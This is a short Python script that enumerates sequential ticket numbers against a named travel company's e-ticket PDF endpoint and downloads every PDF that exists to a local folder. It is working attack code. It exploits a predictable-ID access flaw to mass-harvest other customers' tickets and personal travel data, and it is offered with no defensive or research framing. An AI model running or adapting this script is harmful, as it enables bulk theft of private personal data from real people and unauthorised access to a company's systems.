import requests
from pathlib import Path

def getAllTickets():
	for i in range(53700000, 99999999):
		url = 'http://api.easemytrip.com/EMTService/EticketPdf/' + str(i) + '.pdf'
	
		x = requests.get(url)
		if x.status_code == 200:
			print('xD Success : ' + str(i))
			f = Path.cwd().joinpath('data', 'pdf', str(i) + '.pdf')
			f.write_bytes(x.content)
		else:
			print(':( Fail : ' + str(i))

getAllTickets()